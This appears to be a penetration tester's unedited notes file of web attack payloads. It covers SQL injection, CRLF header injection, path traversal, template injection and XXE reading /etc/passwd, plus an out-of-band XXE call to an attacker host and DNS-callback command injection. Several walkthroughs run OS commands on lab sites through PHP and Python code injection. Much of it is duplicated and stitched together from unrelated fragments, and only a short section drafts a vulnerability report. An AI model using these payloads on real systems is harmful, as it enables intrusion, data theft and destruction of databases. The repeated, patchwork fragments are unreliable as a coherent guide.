
__session_start__/%0aSet-Cookie:malicious_cookie1

field=compset%27%20OR%20%271%27%3D%271
field=compset%27--
field=compset%27%20UNION%20SELECT%20NULL--


?field=compset' AND 1=2 UNION SELECT 1,2,3--
?field=compset' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
?field=compset' AND ASCII(SUBSTRING((SELECT @@version),1,1))>64--
GET /api?field=compset%27%20OR%20%271%27%3D%271 HTTP/1.1
GET /api?field=compset%27-- HTTP/1.1
GET /api?field=compset%27%20UNION%20SELECT%20NULL-- HTTP/1.1


<course>pentest</course>
<foo>hacked</foo>



"1.Open the firefox  browser and go to the website
2.Add  single code '  at the end of the url for eg. - http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'  and if we get below error

Parse error: syntax error, unexpected '';' (T_ENCAPSED_AND_WHITESPACE) in /var/www/index.php(15) : assert code on line 1
Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/index.php on line xx

3. Now we  will balance the query by adding '.''.' at the end of the url.

like : http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'.''.'
If the code error displayed before disappears, then we have successfully balanced the query.

4. Now we can try executing system commands in the url.
 like : '.phpinfo().'    or    '.system('uname -a').'

for eg.
http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'.phpinfo().'
http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'.system('uname -a').'

If we are able to see system information like uname or iinfo, then there is a code execution.
"






"1.Open the firefox  browser and go to the website
2.Add  single code '  at the end of the url for eg. - http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'  and if we get below error

Parse error: syntax error, unexpected '';' (T_ENCAPSED_AND_WHITESPACE) in /var/www/index.php(15) : assert code on line 1
Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/index.php on line xx

3. Now we  will balance the query by adding '.''.' at the end of the url.

like : http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'.''.'
If the code error displayed before disappears, then we have successfully balanced the query.

4. Now we can try executing system commands in the url.
 like : '.phpinfo().'    or    '.system('uname -a').'

for eg.
http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'.phpinfo().'
http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'.system('uname -a').'

If we are able to see system information like uname or iinfo, then there is a code execution.
"


https://www.infosecinstitute.com/resources/application-security/sql-injection-http-headers/
X_FORWARDED_FOR :127.0.0.1' or 1=1#
1;(SELECT+SLEEP(5))--
'; SELECT * FROM users WHERE '1'='1
/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd
code execution:

1.Open the firefox  browser and go to the website
2.Add  single code '  at the end of the url for eg. - http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'  and if we get below error

Parse error: syntax error, unexpected '';' (T_ENCAPSED_AND_WHITESPACE) in /var/www/index.php(15) : assert code on line 1
Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/index.php on line xx

3. Now we  will balance the query by adding '.''.' at the end of the url.

like : http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'.''.'
If the code error displayed before disappears, then we have successfully balanced the query.

4. Now we can try executing system commands in the url.
 like : '.phpinfo().'    or    '.system('uname -a').'

for eg.
http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'.phpinfo().'
http://ptl-d9b36e93-cc831688.libcurl.st/?name=hacker'.system('uname -a').'

If we are able to see system information like uname or iinfo, then there is a code execution.

----------------------------------------------
Yes, you can report this issue as a vulnerability. The exposure of detailed error messages in response to injected payloads can be considered a security vulnerability, specifically an Information Disclosure vulnerability. This type of vulnerability can provide attackers with valuable information about the application's internal workings, which can be leveraged for further attacks.
How to Report the Vulnerability:
Title:
Information Disclosure via Detailed Error Messages
Description:
The application discloses detailed error messages when injecting a payload such as test.om?javascript:alert. These error messages reveal internal details about missing entitlements and properties, which can provide attackers with valuable information about the application's configuration and potential weaknesses.
Impact:
Attackers can use the disclosed information to gain insights into the application's internal structure and configuration, potentially aiding in further attacks. This can lead to more targeted and effective exploitation of other vulnerabilities.
Steps to Reproduce:

Inject the payload test.om?javascript:alert into the application.
Observe the error messages returned by the application.
Note the detailed information about missing entitlements and internal properties.


=&+nslookup+cxx8nlugxbqajjeguq7iwpzsdbxnyfj5o-a6ssjqlda.r87.me&’\”`0&nslookup+cxx8nlugxbqajjeguq7iwpzsdbxnyfj5o-a6ssjqlda.r87.me&`’=&+nslookup+cxx8nlugxbqajjeguq7iwpzsdbxnyfj5o-a6ssjqlda.r87.me&’\”`0&nslookup+cxx8nlugxbqajjeguq7iwpzsdbxnyfj5o-a6ssjqlda.r87.me&`’


id=(select*from(select(sleep(2)))a)&level=silver
union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--
https://www.target.com/ÿ/www.twitter.com/
 https://www.target.com//www.twitter.com/
 https://www.target.com/Ã¿/www.twitter.com/
 https://www.target.com//www.twitter.com/

CLRF : %0d%0aSet-Cookie:test=test;domain=.greenhouse.io 

 /%80d%80aLocation:%20http://www.evilzone.org

/****/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd
Payloads for Testing
{{5+5}}


{{10-3}}


{{4/2}}


{{8%3}}


{{'test'.toUpperCase()}}


{{'test'.length}}


{{'test'.charAt(1)}}


{{alert(1)}}


{{document.cookie}}


{{window.location}}


'; DROP TABLE users; --


' OR '1'='1


' UNION SELECT null, null, null --


../../etc/passwd


../../../../../../windows/system32/drivers/etc/hosts


; ls -la





&& whoami


<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>


<foo>&xxe;</foo>


{"key": "value", "injected": "{{7*7}}"}

Basic Arithmetic Operations:

"label": "{{5+5}}"
"label": "{{10-3}}"
"label": "{{4/2}}"
"label": "{{8%3}}"



String Manipulation:

"label": "{{'test'.toUpperCase()}}"
"label": "{{'test'.length}}"
"label": "{{'test'.charAt(1)}}"



JavaScript Expressions:

"label": "{{alert(1)}}"
"label": "{{document.cookie}}"
"label": "{{window.location}}"



SQL Injection:

"label": "'; DROP TABLE users; --"
"label": "' OR '1'='1"
"label": "' UNION SELECT null, null, null --"



Path Traversal:

"label": "../../etc/passwd"
"label": "../../../../../../windows/system32/drivers/etc/hosts"



Command Injection:

"label": "; ls -la"
"label": "| cat /etc/passwd"
"label": "&& whoami"



XML Injection:

"label": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
"label": "<foo>&xxe;</foo>"



JSON Injection:

"label": "{\"key\": \"value\", \"injected\": \"{{7*7}}\"}"



Payloads for Testing


Basic Arithmetic Operations:

"label": "{{5+5}}"
"label": "{{10-3}}"
"label": "{{4/2}}"
"label": "{{8%3}}"



String Manipulation:

"label": "{{'test'.toUpperCase()}}"
"label": "{{'test'.length}}"
"label": "{{'test'.charAt(1)}}"



JavaScript Expressions:

"label": "{{alert(1)}}"
"label": "{{document.cookie}}"
"label": "{{window.location}}"



SQL Injection:

"label": "'; DROP TABLE users; --"
"label": "' OR '1'='1"
"label": "' UNION SELECT null, null, null --"



Path Traversal:

"label": "../../etc/passwd"
"label": "../../../../../../windows/system32/drivers/etc/hosts"



Command Injection:

"label": "; ls -la"
"label": "| cat /etc/passwd"
"label": "&& whoami"



XML Injection:

"label": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
"label": "<foo>&xxe;</foo>"



JSON Injection:

"label": "{\"key\": \"value\", \"injected\": \"{{7*7}}\"}"


<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<root>
    <name>test</name>
    <tel>028</tel>
    <email>&file;</email>
    <password>pwd</password>
</root>


1.Open the firefox  browser and go to the website
2.Add " codes at the end of the url for eg. - demo.libcurl.so?name=hacker"  and if we get below error

Parse error:syntax error, unexpected '!', expecting ','or ';' in /var/www/index.php(16):
eval()'d code on line x

3. Then we  will get to know that it is a php code with eval() and  Now we  will balance the query by adding "."  or ".." at the end of the url.
If the code error displayed before disappears, then we have successfully balanced the query.

4. Now we can try executing system commands in the url.
 like : ".system("uname -a")."   OR   ".system("id")."

 demo.libcurl.so?name=hacker".system("uname -a")." or hacker".system("id")."

If we are able to see system information like uname or id, then there is a code execution.
 
 
 	
Insert below code to retrive /etc/passwd contents
 1. Change the content type to text/xml then insert below code. Check via repeater
 
 <?xml version="1.0" encoding="ISO-8859-1"?>
  <!DOCTYPE chintan [ 
  <!ELEMENT chintan ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><chintan>&xxe;</foo>
 
 
 Instance 2
 
 Proof of concept:
 -----------------
 1) XML External Entity Injection (CVE-2016-8526)
 a) XXE in VisualRF Backup Sites
 
 Login as any user role (including read-only/standard user)
 Navigate to VisualRF > Floor Plans > Select 'View' under 'Network' section.
 Select a campus (e.g. Default Campus) > Select 'Edit' >
 Select action 'Export Floor Plans' > Ok
 
 POST /visualrf/backup_sites HTTP/1.1
 Host: <AirWaveHost>
 [...]
 
 xml=<?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE x [<!ENTITY %25 foo SYSTEM
 "http://<AttackerHost>:1234/sectest.dtd">%25%66%6f%6f%3b%25%70%61%72%61%6d%31%3b]><visualrf:sites
 xmlns:visualrf="http://www.airwave.com/";








Oracle	dbms_pipe.receive_message(('a'),10)
Microsoft	WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT pg_sleep(10)
MySQL	SELECT SLEEP(10)

 
 	
ASP.NET IE9 chintan Filter evasion for htmlentities
 &lt;%tag style=”chintan:expression(alert(‘chintan’))”&gt;
 ‹%tag style=”chintan:expression(alert(123))”
 ‹%tag style=”chintan:expression(alert(123))”

"%2b"
"%2b"plop"%2b"

try 1+1 i.e; "%2b1%2b1%2b" ->error

try "%2bstr(1%2b1)%2b"

if we get the result i.e; 1+1 2 then its working

Now try 

"%2bstr(__import__('os').system("id"))%2b"

now try https://ptl-d69be1d122d0-5101a1c52c66.libcurl.me/hello/hacker%22%2bstr(__import__('os').popen(%22id%22).read())%2b%22


https://ptl-d69be1d122d0-5101a1c52c66.libcurl.me/hello/hacker%22%2bstr(__import__('os').popen(%22cat%20/etc/passwd%22).read())%2b%22
